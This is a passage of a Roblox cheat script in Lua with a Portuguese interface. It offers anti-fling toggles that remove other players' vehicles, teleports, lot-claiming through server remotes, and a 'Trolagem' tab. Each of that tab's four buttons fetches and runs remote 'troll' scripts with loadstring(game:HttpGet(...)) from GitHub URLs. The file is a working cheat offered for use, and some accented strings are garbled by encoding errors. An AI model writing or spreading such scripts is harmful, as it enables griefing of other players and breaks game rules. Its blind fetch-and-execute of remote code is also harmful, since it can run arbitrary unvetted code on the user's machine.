                    for _, vehicle in ipairs(vehiclesFolder:GetChildren()) do
                        local isMeu = false
                        for _, seat in ipairs(vehicle:GetDescendants()) do
                            if (seat:IsA("VehicleSeat") or seat:IsA("Seat")) and seat.Occupant and seat.Occupant.Parent == LocalPlayer.Character then
                                isMeu = true
                                break
                            end
                        end
                        if not isMeu and vehicle.Parent == vehiclesFolder then
                            moveToBackup(vehicle, removedVehicles)
                        end
                    end
                end
            end)
        else
            if antiVehicleConnection then antiVehicleConnection:Disconnect() end
            restoreFromBackup(removedVehicles)
        end
    end
})


Tab:AddToggle({
    Name = " Ant Canoe Fling",
    Default = false,
    Callback = function(state)
        if state then
            antiCanoeConnection = RunService.Heartbeat:Connect(function()
                local storage = Workspace:FindFirstChild("WorkspaceCom") and Workspace.WorkspaceCom:FindFirstChild("001_CanoeStorage")
                if storage then
                    for _, canoe in ipairs(storage:GetChildren()) do
                        local dono = canoe:FindFirstChild("Owner")
                        if not dono or dono.Value ~= LocalPlayer then
                            if canoe.Parent == storage then
                                moveToBackup(canoe, removedCanoes)
                            end
                        end
                    end
                end
            end)
        else
            if antiCanoeConnection then antiCanoeConnection:Disconnect() end
            restoreFromBackup(removedCanoes)
        end
    end
})


Tab:AddToggle({
    Name = "Ant Fling Jets",
    Default = false,
    Callback = function(state)
        if state then
            antiJetConnection = RunService.Heartbeat:Connect(function()
                local jetFolder = Workspace:FindFirstChild("WorkspaceCom")
                if jetFolder and jetFolder:FindFirstChild("001_Airport") then
                    local storage = jetFolder["001_Airport"]:FindFirstChild("AirportHanger")
                    if storage and storage:FindFirstChild("001_JetStorage") and storage["001_JetStorage"]:FindFirstChild("JetAirport") then
                        for _, jet in ipairs(storage["001_JetStorage"].JetAirport:GetChildren()) do
                            if jet.Name ~= LocalPlayer.Name and jet.Parent == storage["001_JetStorage"].JetAirport then
                                moveToBackup(jet, removedJets)
                            end
                        end
                    end
                end
            end)
        else
            if antiJetConnection then antiJetConnection:Disconnect() end
            restoreFromBackup(removedJets)
        end
    end
})


Tab:AddToggle({
    Name = " Ant Fling helicopter ",
    Default = false,
    Callback = function(state)
        if state then
            antiHeliConnection = RunService.Heartbeat:Connect(function()
                local heliFolder = Workspace:FindFirstChild("WorkspaceCom") and Workspace.WorkspaceCom:FindFirstChild("001_HeliStorage")
                if heliFolder and heliFolder:FindFirstChild("PoliceStationHeli") then
                    for _, heli in ipairs(heliFolder.PoliceStationHeli:GetChildren()) do
                        if heli.Name ~= LocalPlayer.Name and heli.Parent == heliFolder.PoliceStationHeli then
                            moveToBackup(heli, removedHelis)
                        end
                    end
                end
            end)
        else
            if antiHeliConnection then antiHeliConnection:Disconnect() end
            restoreFromBackup(removedHelis)
        end
    end
})


Tab:AddToggle({
    Name = "Ant Fling Ball",
    Default = false,
    Callback = function(state)
        if state then
            antiBallConnection = RunService.Heartbeat:Connect(function()
                local ballFolder = Workspace:FindFirstChild("WorkspaceCom") and Workspace.WorkspaceCom:FindFirstChild("001_SoccerBalls")
                if ballFolder then
                    for _, ball in ipairs(ballFolder:GetChildren()) do
                        if ball.Parent == ballFolder then
                            moveToBackup(ball, removedBalls)
                        end
                    end
                end
            end)
        else
            if antiBallConnection then antiBallConnection:Disconnect() end
            restoreFromBackup(removedBalls)
        end
    end
})


Tab:AddToggle({
    Name = "Anti Sit",
    Default = false,
    Callback = function(state)
        if state then
            antiSitConnection = RunService.Heartbeat:Connect(function()
                local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
                    if humanoid:GetState() == Enum.HumanoidStateType.Seated then
                        humanoid:ChangeState(Enum.HumanoidStateType.Running)
                    end
                    if humanoid.SeatPart then
                        humanoid.Sit = false
                        humanoid.SeatPart = nil
                    end
                end
            end)
        else
            if antiSitConnection then antiSitConnection:Disconnect() end
            local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
            end
        end
    end
})


local Tab = Window:MakeTab({"Spawn ", "box"})


local houses = {
    {id = 1, pos = Vector3.new(257, 2, 207), name = "House 1"},
    {id = 2, pos = Vector3.new(231, 2, 226), name = "House 2"},
    {id = 3, pos = Vector3.new(260, 19, 208), name = "House 3"},
    {id = 4, pos = Vector3.new(227, 19, 223), name = "House 4"},
    {id = 5, pos = Vector3.new(171, 19, 226), name = "House 5"},
    {id = 6, pos = Vector3.new(-37, 19, -145), name = "House 6"},
    {id = 7, pos = Vector3.new(-37, 34, -145), name = "House 7"},
    {id = 11, pos = Vector3.new(-18, 38, 434), name = "House 11"},
    {id = 12, pos = Vector3.new(152, 35, 431), name = "House 12"},
    {id = 13, pos = Vector3.new(252, 33, 429), name = "House 13"},
    {id = 14, pos = Vector3.new(251, 36, 392), name = "House 14"},
    {id = 15, pos = Vector3.new(145, 37, 385), name = "House 15"},
    {id = 16, pos = Vector3.new(-14, 40, 393), name = "House 16"},
    {id = 17, pos = Vector3.new(-186, 35, -249), name = "House 17"},
    {id = 18, pos = Vector3.new(-351, 35, -246), name = "House 18"},
    {id = 19, pos = Vector3.new(-453, 34, -247), name = "House 19"},
    {id = 20, pos = Vector3.new(-450, 36, -297), name = "House 20"},
    {id = 21, pos = Vector3.new(-353, 36, -296), name = "House 21"},
    {id = 22, pos = Vector3.new(-184, 35, -297), name = "House 22"},
    {id = 23, pos = Vector3.new(-407, 66, -449), name = "House 23"},
    {id = 24, pos = Vector3.new(-345, 67, -498), name = "House 24"},
    {id = 28, pos = Vector3.new(-100, 10, 1085), name = "House 28"},
    {id = 29, pos = Vector3.new(-727, 4, 806), name = "House 29"},
    {id = 30, pos = Vector3.new(-242, 5, 820), name = "House 30"},
    {id = 31, pos = Vector3.new(636, 74, -363), name = "House 31"},
    {id = 32, pos = Vector3.new(-905, 4, -363), name = "House 32"},
    {id = 33, pos = Vector3.new(-108, 68, -419), name = "House 33"},
    {id = 34, pos = Vector3.new(227, 36, 567), name = "House 34"},
    {id = 35, pos = Vector3.new(-27, 11, 2207), name = "House 35"},
    {id = 36, pos = Vector3.new(249, 13, -2336), name = "House 36"},
    {id = 37, pos = Vector3.new(-1955, 31, 328), name = "House 37"}
}

local houseOptions = {}
for i, house in ipairs(houses) do
    table.insert(houseOptions, house.name)
end

local selectedHouse = "House 6"

local function getHouseData(houseName)
    for i, house in ipairs(houses) do
        if house.name == houseName then
            return house
        end
    end
    return nil
end

Tab:AddSection({ "Spawn Factory" })

Tab:AddDropdown({
    Name = "Select House For Factory",
    Default = selectedHouse,
    Options = houseOptions,
    Callback = function(Value)
        selectedHouse = Value
    end    
})

Tab:AddButton({
    Name = "Spawn Factory",
    Description = "TP to selected house, spawn Factory and return",
    Callback = function()
        local houseData = getHouseData(selectedHouse)
        if not houseData then
            return
        end

        local player = game.Players.LocalPlayer

        if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
            player.CharacterAdded:Wait()
        end

        local character = player.Character
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

        local originalPosition = humanoidRootPart.CFrame

        humanoidRootPart.CFrame = CFrame.new(houseData.pos)
        wait(0.3)

        pcall(function()
            local args1 = { houseData.id }
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Lot:Claim"):InvokeServer(unpack(args1))

            local args2 = { houseData.id, "001_Landmark" }
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Lot:BuildProperty"):FireServer(unpack(args2))
        end)

        wait(0.5)

        humanoidRootPart.CFrame = originalPosition
    end
})


local Section = Tab:AddSection({"Sky Box [ Fe ]"})


Tab:AddButton({
    Name = "Aplicar Skybox",
    Callback = function()
	    local args = {
	        { 100839513065432 }
	    }
	    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody"):InvokeServer(unpack(args))
	 
	    function missing(t, f, fallback)
	        if type(f) == t then
	            return f
	        end
	        return fallback
	    end
	 
	    cloneref = missing("function", cloneref, function(...) return ... end)
	    
	    local Services = setmetatable({}, {
	        __index = function(_, name)
	            return cloneref(game:GetService(name))
	        end
	    })
	 
	    local Players = Services.Players
	    local player = Players.LocalPlayer
	    local character = player.Character or player.CharacterAdded:Wait()
	    local humanoid = character:WaitForChild("Humanoid")
	 
	    
	    player.CharacterAdded:Connect(function(newCharacter)
	        character = newCharacter
	        humanoid = character:WaitForChild("Humanoid")
	    end)
	 
	    
	    local Settings = {}
	    Settings["Fade In"] = 0.1
	    Settings["Fade Out"] = 0.1
	    Settings["Weight"] = 1
	    Settings["Speed"] = 1
	    Settings["Time Position"] = 0
	 
	    local CurrentTrack
	 
	    
	    local function LoadTrack(id)
	        if CurrentTrack then
	            CurrentTrack:Stop(0)
	        end
	 
	        local animId
	        local ok, result = pcall(function()
	            return game:GetObjects("rbxassetid://" .. tostring(id))
	        end)
	 
	        if ok and result and #result > 0 then
	            local anim = result[1]
	            if anim:IsA("Animation") then
	                animId = anim.AnimationId
	            else
	                animId = "rbxassetid://" .. tostring(id)
	            end
	        else
	            animId = "rbxassetid://" .. tostring(id)
	        end
	 
	        local newAnim = Instance.new("Animation")
	        newAnim.AnimationId = animId
	        local newTrack = humanoid:LoadAnimation(newAnim)
	        newTrack.Priority = Enum.AnimationPriority.Action4
	 
	        local weight = Settings["Weight"]
	        if weight == 0 then
	            weight = 0.001
	        end
	 
	        newTrack:Play(Settings["Fade In"], weight, Settings["Speed"])
	        CurrentTrack = newTrack
	        CurrentTrack.TimePosition = math.clamp(Settings["Time Position"], 0, 1) * CurrentTrack.Length
	 
	        return newTrack
	    end
	    
	    local EmoteId = 139092694533784
	    LoadTrack(EmoteId)
	end
})

local Tab = Window:MakeTab({"Teleport", "timer"})


local Section = Tab:AddSection({"Teleports"})

local player = game.Players.LocalPlayer
local selectedLocation = "Morro"

local Dropdown = Tab:AddDropdown({
    Name = "Locals",
    Description = "Select a location",
    Default = "Sal√£o de Beleza",
    Multi = false,
    Options = {
        "Sal√£o de Beleza",
        "Local do Sof√°",
        "Doceria",
        "Lugar de Jogos",
        "Delegacia",
        "Hospital",
        "Banco Comum",
        "Bombeiros",
        "Cemit√©rio",
        "Escola",
        "Creche",
        "Local das Caixas",
        "Local de Lanches Espanh√≥is",
        "Livraria",
        "Celulares",
        "Coffes",
        "Veterin√°rio",
        "Dentista",
        "Novo Banco",
        "Hotel",
        "Hamburgueria",
        "Aeroporto",
        "Shopping",
        "Apartamento 1",
        "Apartamento 2",
        "Igreja",
        "Praia Guarda-Chuva Azul",
        "Casa Abandonada",
        "Casa de M√°quinas",
        "Praia Normal",
        "Iate",
        "Cabana",
        "Praia Guarda-Chuva Vermelho",
        "Drones",
        "Fazenda 1",
        "Fazenda 2",
        "Pra√ßa",
        "Montanha",
        "Posto de Gasolina",
        "Loja de Roupas"
    },
    Callback = function(value)
        selectedLocation = value
    end
})

local TeleportButton = Tab:AddButton({
    Name = "Teleportar",
    Description = "Teleport local select",
    Callback = function()
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local humanoidRootPart = player.Character.HumanoidRootPart
            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")

            -- Novas localiza√ß√µes
            local locations = {
                ["Sal√£o de Beleza"] = Vector3.new(-76, 4, -123),
                ["Local do Sof√°"] = Vector3.new(-82, 22, -128),
                ["Doceria"] = Vector3.new(-125, 6, -120),
                ["Lugar de Jogos"] = Vector3.new(-172, 1, -126),
                ["Delegacia"] = Vector3.new(-121, 4, 31),
                ["Hospital"] = Vector3.new(-293, 4, 40),
                ["Banco Comum"] = Vector3.new(-358, 25, -143),
                ["Bombeiros"] = Vector3.new(-469, 6, -122),
                ["Cemit√©rio"] = Vector3.new(-486, 7, 56),
                ["Escola"] = Vector3.new(-315, 6, 211),
                ["Creche"] = Vector3.new(-157, 4, 125),
                ["Local das Caixas"] = Vector3.new(-162, 4, 268),
                ["Local de Lanches Espanh√≥is"] = Vector3.new(-169, 20, 291),
                ["Livraria"] = Vector3.new(-129, 4, 259),
                ["Celulares"] = Vector3.new(-127, 21, 253),
                ["Coffes"] = Vector3.new(-96, 5, 250),
                ["Veterin√°rio"] = Vector3.new(-100, 22, 262),
                ["Dentista"] = Vector3.new(-53, 20, 268),
                ["Novo Banco"] = Vector3.new(3, 4, 257),
                ["Hotel"] = Vector3.new(199, 2, 182),
                ["Hamburgueria"] = Vector3.new(156, 8, 39),
                ["Aeroporto"] = Vector3.new(317, 7, 40),
                ["Shopping"] = Vector3.new(165, 5, -158),
                ["Apartamento 1"] = Vector3.new(-35, 20, -126),
                ["Apartamento 2"] = Vector3.new(-34, 37, -136),
                ["Igreja"] = Vector3.new(-64, 37, -192),
                ["Praia Guarda-Chuva Azul"] = Vector3.new(70, 8, -1433),
                ["Casa Abandonada"] = Vector3.new(1044, 8, 54),
                ["Casa de M√°quinas"] = Vector3.new(235, 4, 813),
                ["Praia Normal"] = Vector3.new(-218, 1, 760),
                ["Iate"] = Vector3.new(-125, 33, 856),
                ["Cabana"] = Vector3.new(-249, 6, 1078),
                ["Praia Guarda-Chuva Vermelho"] = Vector3.new(15, 4, 1460),
                ["Drones"] = Vector3.new(-680, 252, 762),
                ["Fazenda 1"] = Vector3.new(-851, 6, -57),
                ["Fazenda 2"] = Vector3.new(-863, 6, -375),
                ["Pra√ßa"] = Vector3.new(-13, 6, -17),
                ["Montanha"] = Vector3.new(-580, 1, 1026),
                ["Posto de Gasolina"] = Vector3.new(133, 2, -338),
                ["Loja de Roupas"] = Vector3.new(-39, 2, 255)
            }

            if locations[selectedLocation] then
                pcall(function()
                    if humanoid then
                        humanoid:ChangeState(Enum.HumanoidStateType.Physics)
                        humanoid.WalkSpeed = 0
                    end
                    humanoidRootPart.Anchored = true
                    humanoidRootPart.CFrame = CFrame.new(locations[selectedLocation])
                    task.wait(0.4)
                    humanoidRootPart.Anchored = false
                    if humanoid then
                        humanoid.WalkSpeed = 16
                        humanoid:ChangeState(Enum.HumanoidStateType.Running)
                    end
                end)
            end
        end
    end
})

local Tab = Window:MakeTab({"Trolagem", "bomb"})  -- aba renomeada com √≠cone

local Section = Tab:AddSection({"Tools/Scripts fe"})  -- se√ß√£o

-- Bot√£o 1
local TrollButton1 = Tab:AddButton({
    Name = "Executar 1x1x1",
    Description = "Clique para se divertir",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/slatosemideias/1x1x1/refs/heads/main/Main.txt"))()
    end
})

-- Bot√£o 2
local TrollButton2 = Tab:AddButton({
    Name = "Executar Goner",
    Description = "Clique para se divertir",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/slatosemideias/goner/refs/heads/main/Main.txt"))()
    end
})

-- Bot√£o 3
local TrollButton3 = Tab:AddButton({
    Name = "Executar c00lkid",
    Description = "Clique para se divertir",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/slatosemideias/c00lkid/refs/heads/main/Main.txt"))()
    end
})

-- Bot√£o 4
local TrollButton4 = Tab:AddButton({
    Name = "Executar BugHammer",
    Description = "Clique para se divertir",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/slatosemideias/bughammer/refs/heads/main/Main.txt"))()
    end
})
